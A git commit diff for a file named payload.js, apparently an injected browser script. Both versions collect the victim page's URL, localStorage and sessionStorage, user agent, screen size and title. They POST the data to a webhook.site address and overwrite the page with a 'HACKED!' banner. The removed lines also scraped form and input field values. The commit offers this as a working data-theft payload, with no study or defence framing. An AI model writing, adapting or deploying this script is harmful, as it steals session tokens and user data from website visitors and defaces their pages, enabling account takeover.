e6c596911dddc86cf6747d1e14bb9c620ca1522c
Feonixid <laerti.shabani2010@gmail.com>
2025-12-03 00:39:40 +0100

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,4 +1,3 @@
-// Steal ALL page data immediately
 (function(){
   var victim = {
     url: window.location.href,
@@ -6,21 +5,14 @@
     localStorage: JSON.stringify(localStorage),
     sessionStorage: JSON.stringify(sessionStorage),
     userAgent: navigator.userAgent,
-    language: navigator.language,
-    platform: navigator.platform,
     screen: screen.width+'x'+screen.height,
-    referrer: document.referrer,
-    title: document.title,
-    forms: Array.from(document.forms).map(f=>f.name||f.id||'unnamed'),
-    inputs: Array.from(document.querySelectorAll('input,textarea')).map(i=>({name:i.name||i.id||'',type:i.type,value:i.value.substring(0,100)}))
+    title: document.title
   };
-  
-(function(){
-  var victim = { /* your existing victim object */ };
   fetch('https://webhook.site/f3d30d6d-8d88-4fd8-8590-b70007607245', {
     method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify(victim)
-  }).then(()=>console.log('Data POSTed!'));
-  document.body.innerHTML = '<h1 style="color:red">HACKED - All data POSTed!</h1>';
+    body: JSON.stringify(victim),
+    headers: {'Content-Type': 'application/json'}
+  });
+  document.body.innerHTML = '<h1 style="color:red">HACKED!</h1>';
 })();
+
